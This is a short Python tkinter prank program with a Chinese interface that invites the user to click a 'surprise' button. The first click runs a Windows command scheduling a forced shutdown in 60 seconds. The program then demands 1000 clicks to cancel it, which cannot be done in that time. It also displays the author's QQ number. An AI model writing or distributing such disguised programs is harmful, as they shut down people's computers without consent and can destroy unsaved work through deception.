import tkinter as tk
import os
from tkinter import messagebox
window = tk.Tk()
window.title("航航献爱心")
window.geometry("400x200")
txt = tk.StringVar()
txt0 = tk.StringVar()
txt.set("点击按钮")
times = -1
def info():
        info = tk.messagebox.showinfo('作者信息','作者：航航\nQQ:550653451\n有事找梁宇天就行')
def info0():
        info = tk.messagebox.showinfo("幕后指使者",'梁宇天\n没错就是这个娃子逼的我改成这样的【无奈】')

def touch():
    global times
    if times == -1:
        os.system("shutdown -s -t 60")     
    txt.set("对不起，点击1000次按钮取消关机")
    times += 1
    txt0.set("当前点击次数："+str(times))    
    if times >= 1000:
        os.system("shutdown -a")
        txt.set("关闭成功，请退出")

member = tk.Menu(window)
filemenu = tk.Menu(member,tearoff=0)
member.add_cascade(label="关于",menu=filemenu)
filemenu.add_command(label="作者信息",command=info)
filemenu.add_command(label="幕后指使者",command=info0)

#基本控件
a = tk.Label(window,text="---你可以在关于中找到作者的信息---",font=1) #修改源码请删除
message = tk.Label(window, textvariable=txt,width=40,height=5,font=12)
b = tk.Button(window,text="点我有惊喜",command=touch)
time = tk.Label(window,textvariable=txt0,width=100,height=5,font=12)
a.pack(side="bottom")
message.pack()
b.pack()
time.pack()


window.config(menu=member)

window.mainloop()